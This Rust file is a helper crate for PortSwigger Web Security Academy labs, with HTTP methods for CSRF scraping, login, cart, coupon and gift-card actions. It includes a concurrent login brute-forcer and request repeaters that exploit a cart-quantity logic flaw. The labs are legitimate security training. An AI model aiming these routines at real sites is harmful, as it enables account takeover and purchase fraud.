use futures::{
    stream::{self, StreamExt},
    TryStreamExt,
};
use reqwest::{Client, Response};
use scraper::{selectable::Selectable, Html, Selector};
use tokio::pin;

/// This crate serves as a way to avoid having to always write code for http requests for the
/// PortSwigger labs
///
/// It can:
/// - Get csrf token
/// - Login as a user
/// - Add products to cart
/// - Make purcheses
/// - Scrape
///
/// Keep in mmind that you can always import it in your project and edit it according to your needs.
///
/// TODO: Add more methods for other labs
///
pub struct MyClient {
    http_client: reqwest::Client,
    pub url: String,
}

/// RedirectPolicy is a custom enum that can be:
/// - All to allow the default redirection that reqwest does
/// - None to follow no redirections
/// - Custom to follow only 303 redirects
pub enum RedirectPolicy {
    All,
    Custom,
    None,
}

impl MyClient {
    pub fn new(url: String, proxy_bool: bool, redirect: RedirectPolicy) -> Self {
        let policy = match redirect {
            RedirectPolicy::Custom => {
                println!("Custom redirect");
                reqwest::redirect::Policy::custom(|attempt| {
                    if attempt.status() == 303 {
                        attempt.follow()
                    } else {
                        attempt.stop()
                    }
                })
            }
            RedirectPolicy::None => {
                println!("no redirects");
                reqwest::redirect::Policy::none()
            }
            RedirectPolicy::All => {
                println!("Follow redirects");
                reqwest::redirect::Policy::limited(4)
            }
        };
        let http_client = Client::builder().redirect(policy).cookie_store(true);
        let http_client = if proxy_bool {
            let proxy_addr = "localhost:8080";
            println!("You need a proxy on {} for this", proxy_addr);
            let proxy = reqwest::Proxy::https(proxy_addr).expect("setting up localhost for proxy");
            http_client.proxy(proxy).danger_accept_invalid_certs(true)
        } else {
            {
                println!("You dont need a proxy on for this");
                http_client
            }
        };
        let http_client = http_client.build().expect("Preparing the client");
        MyClient { http_client, url }
    }

    ///
    /// This is a bit of a hackjob..
    /// You can use Some(att) to find a specific attribute of each tag,
    /// Or set it to None to get the text contents of your tag instead.
    ///
    pub async fn scrape(
        &self,
        text: &str,
        tag_name: &str,
        class_name: &str,
        tag_attr: &str,
        attribute: Option<&str>,
    ) -> anyhow::Result<Vec<String>> {
        let document = Html::parse_document(text);

        let css_selector = format!("{}.{}", tag_name, class_name);
        let tag_selector = Selector::parse(&css_selector).unwrap();
        let child_tag_selector = Selector::parse(tag_attr).unwrap();

        let x = document
            .select(&tag_selector)
            .flat_map(|e| {
                e.select(&child_tag_selector)
                    .filter_map(|o| match attribute {
                        Some(attribute) => o.value().attr(attribute),
                        None => o.text().next(),
                    })
            })
            .map(|v| {
                //println!("{v}");
                v.to_string()
            })
            .collect::<Vec<String>>();

        Ok(x)
    }

    pub async fn print_request(
        &self,
        request: Response,
        status: bool,
        headers: bool,
        body: bool,
    ) -> anyhow::Result<()> {
        if status {
            println!("The Status Code: {}", request.status());
        }
        if headers {
            println!("The Headers: {:#?}", request.headers());
        }
        if body {
            println!("The Body: {}", request.text().await?);
        }
        Ok(())
    }

    ///
    /// This doesnt work with transfer encoding chunked :((
    /// The reqwest uses a safe network stack that doesnt allow for illega/malformed requests.
    /// This makes a lot of the web attacks impossible unless we impliment our own network stack.
    /// :'(
    ///
    pub async fn get_request(
        &self,
        endpoint: &str,
        header: Option<&str>,
    ) -> anyhow::Result<Response> {
        let url = format!("{}{}", self.url, endpoint);
        let http_client = self.http_client.get(url);

        let http_client = match header {
            Some(header) => {
                let v: Vec<&str> = header.split(":").collect();
                let key = v[0].trim();
                let val = v[1].trim();
                http_client.header(key, val)
            }
            None => http_client,
        };

        let res = http_client.send().await?;
        Ok(res)
    }

    ///
    /// Similar with the get_request, but its a post request instead.
    /// We can use custom headers if we want but they need to be "legal".
    ///
    pub async fn post_request(
        &self,
        endpoint: &str,
        body: String,
        header: Option<&str>,
    ) -> anyhow::Result<Response> {
        let url = format!("{}{}", self.url, endpoint);
        let http_client = self.http_client.post(url);

        let http_client = match header {
            Some(header) => {
                let v: Vec<&str> = header.split(":").collect();
                let key = v[0].trim();
                let val = v[1].trim();
                http_client.header(key, val)
            }
            None => http_client,
        };

        let res = http_client.body(body).send().await?;
        Ok(res)
    }

    pub async fn login(&self, username: &str, password: &str) -> anyhow::Result<Response> {
        let endpoint = "/login";
        let url = format!("{}{}", self.url, endpoint);
        let csrf = self.get_csrf(endpoint).await?;
        let body = format!("csrf={}&username={}&password={}", csrf, username, password);
        let res = self.http_client.post(url).body(body).send().await?;
        Ok(res)
    }

    pub async fn check_cart(&self) -> anyhow::Result<()> {
        let url = format!("{}/cart", self.url);
        self.http_client.get(url).send().await?;
        Ok(())
    }

    pub async fn apply_coupon(&self, coupon: &str) -> anyhow::Result<()> {
        let csrf = self.get_csrf("/cart").await?;
        let endpoint = "/cart/coupon";
        let body = format!("csrf={}&coupon={}", csrf, coupon);
        self.post_request(endpoint, body, None).await?;
        Ok(())
    }

    /// try_for_each requires to iterate through Oks and you can build a logic that if it is
    /// sattisfied it returns an error and doesnt have to iterate through all of the gift cards,
    /// cause many of them are already used but still appear.
    ///
    pub async fn redeem_giftcards(&self, gift_cards: Vec<String>) -> anyhow::Result<()> {
        //for gift_card in gift_cards {
        let csrf = self.get_csrf("/my-account").await?;
        let _ = stream::iter(gift_cards)
            .map(|s| Ok((s, &csrf)))
            .try_for_each(|(gift_card, csrf)| async move {
                let url = format!("{}/gift-card", self.url);
                let body = format!("csrf={}&gift-card={}", csrf, gift_card);
                let res = self
                    .http_client
                    .post(url)
                    .body(body)
                    .send()
                    .await
                    .expect("making the post request");
                if res.status().is_client_error() {
                    println!("returned 400 error and hopefully breaking out..");
                    Err(())
                } else {
                    Ok(())
                }
            })
            .await;
        Ok(())
    }

    pub async fn add2cart(&self, product: u16, times: u16) -> anyhow::Result<()> {
        let url = format!("{}/cart", self.url);
        let times_str = times.to_string();
        let product_str = product.to_string();
        let body = format!(
            "productId={}&quantity={}&redir=CART",
            product_str, times_str
        );
        self.http_client.post(url).body(body).send().await?;
        Ok(())
    }

    pub async fn purchase(&self) -> anyhow::Result<reqwest::Response> {
        let endpoint = "/cart";
        let csrf = self.get_csrf(endpoint).await?;
        let body = format!("csrf={}", csrf);
        let url = format!("{}{}/checkout", self.url, endpoint);
        let res = self.http_client.post(url).body(body).send().await?;
        Ok(res)
    }

    /// If the target website has a different layout then you need to edit how to scrape the csrf
    /// token
    ///
    /// TODO add logs instead for the printing of the csrf
    ///
    async fn get_csrf(&self, endpoint: &str) -> anyhow::Result<String> {
        let url = format!("{}{}", &self.url, endpoint);
        let res = self.http_client.get(url).send().await?.text().await?;
        let document = Html::parse_document(&res);
        let selector = Selector::parse("input[name='csrf']").expect("building the selector");
        if let Some(element) = document.select(&selector).next() {
            if let Some(csrf) = element.value().attr("value") {
                //println!("The csrf is {}", csrf);
                return Ok(csrf.to_string());
            }
        }
        Err(anyhow::anyhow!("Coulnt get csrf"))
    }

    /// This is to send multiple requests for the lab Low-Level Logic Flaw
    ///
    /// You will need to edit it to fit your needs
    ///
    /// WARNING: for some reason it doesnt send the requests properly each time and it sends less!
    ///
    pub async fn repeater(&self, concurrency: usize, num_requests: u16) {
        let x: Vec<()> = stream::iter(1..=num_requests)
            .map(|_| async move {
                match self.add2cart(1, 99).await {
                    Ok(()) => Some(()),
                    Err(_) => None,
                }
            })
            .buffer_unordered(concurrency)
            .filter_map(|res| async move { res })
            .collect()
            .await;
        println!("we did {} many requests", x.len());
    }

    pub async fn repeater_serial(&self, num_requests: u16) {
        let _ = stream::iter(1..=num_requests)
            .for_each(|_| async {
                let result = self.add2cart(1, 99).await;
                if let Err(e) = result {
                    eprintln!("Error {e}");
                }
            })
            .await;
    }

    /// We made it work!
    /// When it finds a password it stops checking the other elements and continues for another
    /// username!
    ///
    pub async fn bruteforcer<I>(
        &self,
        usernames: I,
        passwords: I,
        concurrency: usize,
    ) -> Vec<(String, String)>
    where
        I: IntoIterator<Item = String> + Clone,
    {
        let mut creds = Vec::new();
        for user in usernames {
            let passwords = passwords.clone();

            let x = stream::iter(passwords)
                .map(|pass| {
                    let user = user.clone();
                    async move {
                        let res = self.login(&user, &pass).await;
                        match res {
                            Ok(res) => {
                                if res.status().is_redirection() {
                                    println!("we got the creds.");
                                    Some((user, pass))
                                } else {
                                    None
                                }
                            }
                            Err(_) => None,
                        }
                    }
                })
                .buffer_unordered(concurrency)
                .filter_map(|result| async { result });
            pin!(x);
            if let Some((user, pass)) = x.next().await {
                creds.push((user, pass));
                continue;
            };
        }
        creds
    }

    /// This was a silly function to scrape the div of the DOM and find the product id it needs to
    /// add to get a specific total price in the cart for Loe-Level Logic Flaw lab
    pub async fn find_final(&self, price2check: &str) -> anyhow::Result<()> {
        let res = self.http_client.get(&self.url).send().await?.text().await?;
        let document = Html::parse_document(&res);
        let div_cont_selector =
            Selector::parse("div.container").expect("Getting the div container");
        let div_selector = Selector::parse("div").expect("Getting the divs");
        let button_selector = Selector::parse("a.button").expect("Getting the button");

        let x = document
            .select(&div_cont_selector)
            .flat_map(|element| element.select(&div_selector))
            .filter_map(|element| {
                let div_str = element.inner_html();
                for line in div_str.lines() {
                    let line = line.trim();
                    if line.starts_with(price2check) && line.len() == 6 {
                        if let Some(element) = element.select(&button_selector).next() {
                            if let Some(href) = element.value().attr("href") {
                                let product_id = href
                                    .split("=")
                                    .nth(1)
                                    .expect("getting product ID")
                                    .parse::<u16>()
                                    .expect("Parsing the product ID");
                                let price = line[1..].parse::<f32>().expect("parsing the price");

                                return Some((price, product_id));
                            }
                        }
                    }
                }
                None
            })
            .collect::<Vec<(f32, u16)>>();

        if x.is_empty() {
            return Err(anyhow::anyhow!("no product that costs {}0+", price2check));
        }

        let (price, product) = x[0];

        let times = (1221.96 / price).round() as u16 + 1;

        self.add2cart(product, times).await?;

        Ok(())
    }
}
